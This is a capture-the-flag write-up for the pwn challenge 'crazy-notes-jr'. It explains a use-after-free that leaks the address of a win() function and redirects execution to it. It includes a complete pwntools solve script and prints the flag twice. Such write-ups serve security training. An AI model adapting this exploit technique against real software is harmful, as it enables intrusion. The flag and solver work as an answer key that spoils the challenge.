# crazy-notes-jr

**Category:** PWN
**Flag:** `Hack0n{u4f_s3cret_d1sc0ver3d}`

## Description

> "El hermano pequeño de crazy notes."

## TL;DR

Use-After-Free (UAF) vulnerability: free a note chunk, trigger hidden `secret()` function (option 6) to reallocate the same chunk with `&win` written into it, leak PIE base via `show`, then `jump` directly to `win()` which runs `system("cat flag.txt")`.

## Analysis

Binary protections:
- PIE enabled
- NX enabled
- Stack Canary
- Partial RELRO

The binary is a note-taking app with 5 menu options (and a hidden 6th):

1. **Create**: `malloc(0x20)`, reads up to 31 bytes
2. **Show**: prints `*(void**)notes[idx]` (first 8 bytes as pointer via `printf("Data: %p\n", ...)`)
3. **Delete**: `free(notes[idx])` but **never NULLs the pointer** → UAF
4. **Jump**: reads a hex address and `call *addr` → arbitrary code execution
5. **Exit**
6. **Secret** (hidden): `malloc(0x20)`, writes `&win` into the first 8 bytes of the new chunk

The `win()` function at offset `0x11b9` runs `system("cat flag.txt")`.

## Solution

### Exploit Chain

1. Create note[0] → `malloc(0x20)`, fills tcache with our chunk
2. Delete note[0] → `free()` but `notes[0]` pointer **not cleared** (UAF)
3. Call secret (option 6) → tcache returns the **same chunk**, writes `&win` into byte 0-7
4. Show note[0] → UAF read: `printf("Data: %p", *(void**)notes[0])` = `printf("Data: %p", win_addr)` → **PIE leak**
5. Calculate `pie_base = leaked_addr - 0x11b9`
6. Jump (option 4) → supply `win_addr` → `system("cat flag.txt")`

### Prerequisites

```bash
pip install pwntools --break-system-packages
```

### Solve Script

```python
#!/usr/bin/env python3
# solve.py — crazy-notes-jr solver
# Usage: python3 solve.py [REMOTE_HOST REMOTE_PORT]

from pwn import *

exe = ELF('./files/chall', checksec=False)
context.binary = exe
context.log_level = 'info'

def start(host=None, port=None):
    if host:
        return remote(host, port)
    return process(exe.path)

def menu(io):
    io.recvuntil(b'Exit\n')

def create(io, idx, data):
    menu(io); io.sendline(b'1')
    io.recvuntil(b'Index: '); io.sendline(str(idx).encode())
    io.recvuntil(b'Data: '); io.sendline(data)
    io.recvuntil(b'Note created')

def show(io, idx):
    menu(io); io.sendline(b'2')
    io.recvuntil(b'Index: '); io.sendline(str(idx).encode())
    io.recvuntil(b'Data: ')
    return int(io.recvline().strip(), 16)

def delete(io, idx):
    menu(io); io.sendline(b'3')
    io.recvuntil(b'Index: '); io.sendline(str(idx).encode())
    io.recvuntil(b'Note deleted')

def secret(io):
    menu(io); io.sendline(b'6')

def jump(io, addr):
    menu(io); io.sendline(b'4')
    io.recvuntil(b'Address: '); io.sendline(hex(addr).encode())
    io.recvuntil(b'Jumping...')

import sys
if len(sys.argv) == 3:
    io = start(sys.argv[1], int(sys.argv[2]))
else:
    io = start()

create(io, 0, b'AAAAAAAAAAAAAAAA')
delete(io, 0)
secret(io)
win_leak = show(io, 0)
pie_base = win_leak - 0x11b9
log.success(f"PIE base @ {hex(pie_base)}")
jump(io, win_leak)

flag = io.recvall(timeout=5)
print(flag.decode())
```

## Flag

```
Hack0n{u4f_s3cret_d1sc0ver3d}
```
